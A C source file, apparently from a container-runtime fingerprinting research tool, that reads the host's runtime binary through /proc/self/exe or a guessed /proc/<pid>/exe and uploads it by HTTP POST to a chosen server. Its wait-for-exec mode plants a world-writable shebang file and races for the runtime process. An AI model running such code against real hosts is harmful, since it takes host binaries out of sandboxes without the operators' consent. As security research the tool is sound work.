#include "upload_runtime.h"


void print_help(void)
{
    char * help_format = \
"Usage: upload_runtime [options] <server_ip>\n\n"
"Options:\n"
" -p, --port                 Port of remote server, defaults to %d\n"
" -e, --exec                 Wait for exec mode for static container runtimes, wait until an exec to the container occurred\n"
" -b, --exec-bin             In exec mode, overrides the default binary created for the exec, default is %d\n"
" -a, --exec-extra-argument  In exec mode, pass an additional argument to the runtime so it won't exit quickly\n";
    printf(help_format, DEFAULT_PORT, DEFAULT_EXEC_BIN);
}


int parse_arguments(config * conf, int argc, char const *argv[])
{
    int opt;
    while ((opt = getopt_long(argc, (char * const*)argv, "b:p:a:e", long_options, NULL)) != -1)
    {
        switch (opt) 
        {
            case 'p':
                conf->port = atoi(optarg);
                break;
            case 'e':
                conf->wait_for_exec = true;
                break;
            case 'a':
                conf->exec_extra_arg = optarg;
                break;
            case 'b':
                conf->exec_bin = optarg;
                break;
            default: /* '?' */
                print_help();
                return 1;
        }
    }
    if (optind >= argc) 
    {
        print_help();
        return 1;
    }
    conf->server_ip = argv[optind];
    return 0;

}


bool send_post_file_http_header(int sockfd, const char * server_ip, unsigned long long file_size, const char * filename)
{
    char header[HEADER_BUF_SIZE];
    char * header_format;
    int rc;

    if (filename != NULL)
    {
        header_format =
          "POST / HTTP/1.1\r\n"
          "Host: %s\r\n"
          "Content-Type: application/octet-stream\r\n"
          "Content-Length: %llu\r\n" 
          "Content-Disposition: attachment; filename=\"%s\"\r\n"
          "Connection: close\r\n"
          "\r\n";

        rc = snprintf(header, HEADER_BUF_SIZE, header_format, server_ip, file_size, filename);
    }
    else
    {
        header_format =
          "POST / HTTP/1.1\r\n"
          "Host: %s\r\n"
          "Content-Type: application/octet-stream\r\n"
          "Content-Length: %llu\r\n" 
          "Content-Disposition: attachment\r\n"
          "Connection: close\r\n"
          "\r\n";

        rc = snprintf(header, HEADER_BUF_SIZE, header_format, server_ip, file_size);
    }

    if (rc < 0) 
    {
        printf("[!] send_http_header: snprintf(header) failed with '%s'\n", strerror(errno));
        return false;
    }
    if (rc >= HEADER_BUF_SIZE)
    {
        printf("[!] send_http_header: snprintf(header) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, HEADER_BUF_SIZE);
        return false;
    }

    return send_all(sockfd, (void *) header, (size_t) strlen(header));

}


bool prepare_bin_for_exec(const char * exec_bin_path, const char * extra_arg)
{
    FILE * bin_fp;
    char shebang_buff[SMALL_BUF_SIZE];
    unsigned int extra_arg_len;
    int rc;

    if (extra_arg)
    {
        extra_arg_len = strlen(extra_arg);
        if (extra_arg_len > SMALL_BUF_SIZE - 20) // 20 to save room for '#!/proc/self/exe '
        {
            printf("[!] prepare_bin_for_exec: exec_extra_arg too long (is %u while max is %u)\n", extra_arg_len, SMALL_BUF_SIZE - 20);
            return false;
        }

        rc = snprintf(shebang_buff, SMALL_BUF_SIZE, "#!/proc/self/exe %s", extra_arg);
        if (rc < 0) 
        {
            printf("[!] prepare_bin_for_exec: snprintf(header) failed with '%s'\n", strerror(errno));
            return false;
        } // intentionally not checking if rc >= SMALL_BUF_SIZE, as verifying the strlen(extra_arg) should be enough
    }
    else
        strcpy(shebang_buff, "#!/proc/self/exe");

    // Open file
    bin_fp = fopen(exec_bin_path, "w");
    if (!bin_fp)
    {
        printf("[!] prepare_bin_for_exec: fopen(exec_bin_path) failed with '%s'\n", strerror(errno));
        return false;
    }

    // Write shebang line to file
    if (fputs(shebang_buff, bin_fp) == EOF)
    {
        printf("[!] prepare_bin_for_exec: fputs() failed with '%s'\n", strerror(errno));
        fclose(bin_fp);
        return false;
    }

    // chmod(exec_bin_path, 0777) 
    if (chmod(exec_bin_path, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH) < 0)
    {
        printf("[!] prepare_bin_for_exec: chmod(exec_bin_path) failed with '%s'\n", strerror(errno));
        fclose(bin_fp);
        return false;
    }

    fclose(bin_fp);
    return true;

}


pid_t guess_next_pid()
{
    pid_t child_pid;
    child_pid = fork();

    if(child_pid >= 0) // fork was successful
    {
        if (child_pid == 0) // child process
            exit(EXIT_SUCCESS);
        else //Parent process
        {
            wait(NULL);
            return child_pid + 1;
        }
    }
    else // fork failed
    {
        printf("[!] guess_next_pid: fork() failed with '%s'\n",strerror(errno));
        return -1;
    }

}


int main(int argc, char const *argv[])
{
    int sockfd, runtime_fd = -1;
    struct stat file_info;
    char runtime_path_buf[SMALL_BUF_SIZE];  
    char * runtime_path, *runtime_link;
    int rc;

    config conf = {
        .server_ip = NULL, 
        .port = DEFAULT_PORT, 
        .wait_for_exec = false,
        .exec_extra_arg = NULL,
        .exec_bin = DEFAULT_EXEC_BIN
    };
    if (parse_arguments(&conf, argc, argv) != 0)
        return 1;

    /* Get a fd for the container runtime */
    if (!conf.wait_for_exec)
    {
        // Running as the dynamic linker of the runtime process, so the runtime should be accessible at /proc/self/exe
        runtime_link = "/proc/self/exe";
        runtime_fd = open(runtime_link, O_RDONLY); 
        if (runtime_fd < 0)
        {
            printf("[!] main: open(\"/proc/self/exe\") failed with '%s'\n", strerror(errno));
            return 1;
        }
    }
    else
    {   
        // Running as a normal process in the container, waiting for the runtime to exec in
        char runtime_link_buf[SMALL_BUF_SIZE];
        pid_t guessed_next_pid;

        printf("[+] Running in wait for exec mode; preparing '%s'\n", conf.exec_bin);

        // Create an executable at conf.exec_bin containing a shebang that points to the container runtime (#!/proc/self/exe)
        if (prepare_bin_for_exec(conf.exec_bin, conf.exec_extra_arg) == false)
            return 1;  // error printed in prepare_bin_for_exec()

        // Try to guess as what pid the runtime process will pop up as in our pid ns
        guessed_next_pid = guess_next_pid();
        if (guessed_next_pid < 0)
            return 1; // error printed in guess_next_pid

        // Prepare /proc/$guessed_pid/exe
        rc = snprintf(runtime_link_buf, SMALL_BUF_SIZE, "/proc/%d/exe", guessed_next_pid);
        if (rc < 0) 
        {
            printf("[!] main: snprintf(runtime_link_buf, /proc/%%d/exe) failed with '%s'\n", strerror(errno));
            return 1;
        }
        if (rc >= SMALL_BUF_SIZE)
        {
            printf("[!] main: snprintf(runtime_link_buf, /proc/%%d/exe) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, SMALL_BUF_SIZE);
            return 1;
        }

        // Try to catch the runtime
        printf("[+] Waiting for the runtime to exec into container... (do '$runtime exec whoc-ctr-name %s')\n", conf.exec_bin);
        while (runtime_fd < 0)
            runtime_fd = open(runtime_link_buf, O_RDONLY);
        printf("[+] Got runtime as /proc/%u/exe\n", guessed_next_pid);

        // The runtime process may have already exited, so we'll try to read the runtime's path from the fd we opened for it
        // Prepare /proc/self/fd/runtime_fd
        rc = snprintf(runtime_link_buf, SMALL_BUF_SIZE, "/proc/self/fd/%d", runtime_fd);
        if (rc < 0) 
        {
            printf("[!] main: snprintf(/proc/self/fd/%%d) failed with '%s'\n", strerror(errno));
            return 1;
        }
        if (rc >= SMALL_BUF_SIZE)
        {
            printf("[!] main: snprintf(runtime_link_buf, /proc/self/fd/%%d) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, SMALL_BUF_SIZE);
            return 1;
        }
        runtime_link = runtime_link_buf;
    }

    /* Get container runtime size */
    if(fstat(runtime_fd, &file_info) != 0)
    {
        printf("[!] upload_file: fstat(fp) failed with '%s'\n", strerror(errno));
        goto close_runtime_ret_1;
    }
    /* Try to get the runtime's path on the host */
    rc = readlink(runtime_link, runtime_path_buf, SMALL_BUF_SIZE);
    if (rc < 0)
    {
        printf("[!] main: readlink(runtime_link) failed with '%s', continuing without the runtime's path\n", strerror(errno));
        runtime_path = NULL;
    }
    else
    {
        runtime_path_buf[rc] = 0;
        runtime_path = runtime_path_buf;
    }

    printf("[+] Uploading...\n");
    /* connect to server */
    sockfd = connect_to_server(conf.server_ip, conf.port, SEND_TIMEOUT, RECV_TIMEOUT);
    if (sockfd < 0)
        return 1;  // error printed in connect_to_server()


    /* send POST http header */
    if (send_post_file_http_header(sockfd, conf.server_ip, (unsigned long long)file_info.st_size, runtime_path) == false)
        goto close_both_ret_1;

    /* send container runtime to  server */
    if (sendfile_all(sockfd, runtime_fd, (size_t)file_info.st_size) == false)
        goto close_both_ret_1;

    printf("[+] Done\n");
    return 0;

close_both_ret_1:
    close(sockfd);
close_runtime_ret_1:
    close(runtime_fd); 
    return 1;
}
